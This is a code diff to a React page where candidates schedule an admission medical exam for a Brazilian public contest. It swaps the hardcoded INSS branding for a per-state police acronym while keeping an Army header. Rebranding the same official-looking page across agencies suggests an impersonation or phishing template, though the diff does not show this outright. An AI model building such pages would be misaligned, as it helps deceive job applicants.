@@ -6,6 +6,7 @@ import { Shield, CheckCircle } from 'lucide-react';
 import { useClarityEvents } from '@/hooks/use-clarity-events';
 import { MedicalSchedulingLoader } from '@/components/MedicalSchedulingLoader';
 import { normalizeGender } from '@/utils/gender';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface MedicalCenter {
   id: string;
@@ -21,6 +22,8 @@ interface MedicalCenter {
 
 export default function AgendamentoMedicoPage() {
   const [, setLocation] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
   const [candidateName, setCandidateName] = useState('');
   const [cityName, setCityName] = useState('');
   const [candidateGender, setCandidateGender] = useState('');
@@ -335,7 +338,7 @@ export default function AgendamentoMedicoPage() {
 
   return (
     <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
-      <ExercitoHeader />
+      <ExercitoHeader customTitle={sigla} />
       
       <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
         <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
@@ -356,8 +359,8 @@ export default function AgendamentoMedicoPage() {
           </h1>
           <p className="text-sm text-gray-500 leading-relaxed mb-0">
             {candidateName
-              ? `${candidateName}, selecione data e local para sua perícia médica admissional — Concurso Público INSS 2026.`
-              : "Selecione data e local para sua perícia médica admissional — Concurso Público INSS 2026."
+              ? `${candidateName}, selecione data e local para sua perícia médica admissional — Concurso ${sigla} 2026.`
+              : `Selecione data e local para sua perícia médica admissional — Concurso ${sigla} 2026.`
             }
             {candidateGender === 'feminino' && <> Processo com total privacidade e respeito às especificidades femininas.</>}
           </p>
@@ -394,7 +397,7 @@ export default function AgendamentoMedicoPage() {
             <div className="flex items-start space-x-2 p-3 bg-white border border-gray-200 rounded-lg">
               <Shield className="w-4 h-4 text-gray-500 flex-shrink-0 mt-0.5" />
               <p className="text-sm text-gray-600">
-                <strong className="text-gray-800">Atendimento por profissionais femininas:</strong> Toda perícia será realizada por médicas e enfermeiras, conforme protocolo do INSS.
+                <strong className="text-gray-800">Atendimento por profissionais femininas:</strong> Toda perícia será realizada por médicas e enfermeiras, conforme protocolo da {sigla}.
               </p>
             </div>
           </article>
